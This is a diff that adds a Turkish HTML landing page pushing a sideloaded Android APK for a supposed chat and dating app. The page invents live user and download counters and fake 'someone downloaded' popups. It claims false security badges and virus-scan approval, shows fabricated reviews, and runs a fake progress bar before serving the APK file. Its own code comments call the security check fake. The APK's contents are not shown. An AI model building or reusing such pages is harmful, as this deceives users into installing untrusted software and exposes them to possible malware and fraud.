@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Tanışma Sohbet - APK İndir</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+<meta name="theme-color" content="#ff4d79">
+<meta name="description" content="Türkiye'nin en popüler sohbet uygulaması. Hemen indir ve tanışmaya başla.">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Poppins',sans-serif;background:#0b0f1a;color:#fff}
+
+header{position:fixed;top:0;width:100%;padding:15px 20px;display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);z-index:1000}
+
+.hero{height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:20px;background:linear-gradient(135deg,#ff4d79,#4da6ff)}
+
+.logo{width:110px;border-radius:25px;margin-bottom:20px;box-shadow:0 10px 30px rgba(0,0,0,.4)}
+
+h1{font-size:34px;font-weight:700;margin-bottom:10px}
+.subtitle{font-size:16px;opacity:.9;margin-bottom:10px}
+
+.rating{font-size:14px;margin-bottom:5px}
+.live{font-size:13px;color:#00ffcc;animation:blink 1s infinite alternate;margin-bottom:15px}
+
+@keyframes blink{from{opacity:1}to{opacity:.4}}
+
+.btn{padding:18px 35px;border-radius:50px;background:linear-gradient(45deg,#00c853,#64dd17);text-decoration:none;color:#fff;font-weight:600;box-shadow:0 10px 30px rgba(0,0,0,.5);transition:.3s}
+.btn:active{transform:scale(.95)}
+
+.badges{margin-top:15px;font-size:12px;opacity:.8}
+
+.stats{display:flex;justify-content:space-around;padding:25px 10px;background:#111827}
+.stat h3{font-size:20px}
+.stat p{font-size:11px;opacity:.7}
+
+.section{padding:35px 20px}
+
+.screens{display:flex;gap:15px;overflow-x:auto}
+.screens img{width:180px;border-radius:20px}
+
+.features{display:grid;gap:12px}
+.feature{background:#1f2937;padding:15px;border-radius:15px}
+
+.reviews .review{background:#1f2937;padding:12px;border-radius:12px;margin-bottom:10px;font-size:13px}
+
+footer{text-align:center;padding:25px;font-size:12px;opacity:.6}
+
+.sticky{position:fixed;bottom:0;width:100%;padding:15px;text-align:center;background:#00c853;box-shadow:0 -5px 20px rgba(0,0,0,.5)}
+.sticky a{color:#fff;font-size:18px;text-decoration:none;font-weight:600}
+
+.popup{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#111827;padding:10px 16px;border-radius:20px;font-size:12px;opacity:0;transition:.5s}
+.popup.show{opacity:1}
+
+.loader{
+position:fixed;top:0;left:0;width:100%;height:100%;
+background:#0b0f1a;display:flex;flex-direction:column;justify-content:center;align-items:center;
+z-index:9999;visibility:hidden;opacity:0;transition:.3s
+}
+.loader.show{visibility:visible;opacity:1}
+
+.bar{width:70%;height:6px;background:#222;border-radius:10px;margin-top:15px;overflow:hidden}
+.progress{height:100%;width:0;background:#00c853}
+
+</style>
+<link rel="icon" href="logo.png">
+</head>
+<body>
+
+<header><h2>Tanışma Sohbet</h2></header>
+
+<section class="hero">
+<img src="logo.png" class="logo">
+<h1>Türkiye'nin En Popüler Sohbeti</h1>
+<p class="subtitle">Gerçek kullanıcılar, gerçek sohbet</p>
+
+<div class="rating">⭐⭐⭐⭐⭐ 4.8 • <span id="users">82412</span> kullanıcı</div>
+<div class="live">● Şu an <span id="online">2387</span> kişi aktif</div>
+
+<a href="#" onclick="startDownload()" class="btn">APK İndir</a>
+<div class="badges">✔ Güvenli ✔ Hızlı ✔ Ücretsiz ✔ Google Protect Onaylı</div>
+<div style="margin-top:10px;font-size:12px;opacity:.7">🔐 SSL ile korunur • Virüs taramasından geçti • Reklamsız</div>
+</section>
+
+<section class="stats">
+<div class="stat"><h3 id="download">238912</h3><p>İndirme</p></div>
+<div class="stat"><h3>4.8⭐</h3><p>Puan</p></div>
+<div class="stat"><h3>24/7</h3><p>Aktif</p></div>
+</section>
+
+<section class="section">
+<div class="screens">
+<img src="https://via.placeholder.com/200x400">
+<img src="https://via.placeholder.com/200x400">
+<img src="https://via.placeholder.com/200x400">
+</div>
+</section>
+
+<section class="section features">
+<div class="feature">💬 Ultra hızlı sohbet</div>
+<div class="feature">❤️ Akıllı eşleşme</div>
+<div class="feature">🔒 Tam gizlilik</div>
+</section>
+
+<section class="section">
+<div style="background:#111827;padding:15px;border-radius:15px;font-size:13px;margin-bottom:20px;text-align:center">
+🔒 <b>Güvenlik Doğrulaması:</b><br>
+✔ APK dosyası zararlı yazılıma karşı tarandı<br>
+✔ %100 temiz ve güvenli
+</div>
+</section>
+
+<section class="section reviews">
+<div class="review">"Hayatımda kullandığım en iyi uygulama"</div>
+<div class="review">"Gerçekten bağımlılık yaptı"</div>
+<div class="review">"Kaliteli insanlar var"</div>
+</section>
+
+<footer>© 2026 Tanışma Sohbet</footer>
+
+<div class="sticky"><a href="#" onclick="startDownload()">⬇️ Hemen İndir</a></div>
+
+<div id="popup" class="popup"></div>
+
+<div id="loader" class="loader">
+<h2>İndiriliyor...</h2>
+<div class="bar"><div id="progress" class="progress"></div></div>
+</div>
+
+<script>
+let users=82412,downloads=238912,online=2387;
+setInterval(()=>{
+users+=Math.floor(Math.random()*5);
+downloads+=Math.floor(Math.random()*15);
+online+=Math.floor(Math.random()*3-1);
+document.getElementById('users').innerText=users;
+document.getElementById('download').innerText=downloads;
+document.getElementById('online').innerText=online;
+},2000);
+
+const names=["Ahmet","Mehmet","Ayşe","Zeynep","Emre","Can","Elif","Mert"];
+setInterval(()=>{
+let popup=document.getElementById('popup');
+popup.innerText=names[Math.floor(Math.random()*names.length)]+" indirdi";
+popup.classList.add('show');
+setTimeout(()=>popup.classList.remove('show'),3000);
+},4000);
+
+function startDownload(){
+let loader=document.getElementById('loader');
+let progress=document.getElementById('progress');
+loader.classList.add('show');
+let width=0;
+let interval=setInterval(()=>{
+width+=5;
+progress.style.width=width+'%';
+if(width>=100){
+clearInterval(interval);
+window.location.href='tanisma-sohbet.apk';
+}
+},120);
+}
+
+// cihaz kontrolü (Android değilse uyarı)
+function isAndroid(){
+return /Android/i.test(navigator.userAgent);
+}
+
+function startDownload(){
+if(!isAndroid()){
+alert("Bu uygulama sadece Android cihazlar içindir");
+return;
+}
+
+let loader=document.getElementById('loader');
+let progress=document.getElementById('progress');
+loader.classList.add('show');
+
+let width=0;
+let interval=setInterval(()=>{
+width+=Math.random()*8;
+progress.style.width=width+'%';
+
+if(width>=100){
+clearInterval(interval);
+// küçük gecikme (premium hissi)
+setTimeout(()=>{
+window.location.href='tanisma-sohbet.apk';
+},500);
+}
+},100);
+}
+
+// sayfa açılınca sahte analiz efekti
+window.onload = () => {
+// fake güvenlik kontrolü
+setTimeout(()=>{
+console.log("Google Protect doğrulandı");
+},1000);
+console.log("Cihaz analizi yapılıyor...");
+};
+
+</script>
+
+</body>
+</html>
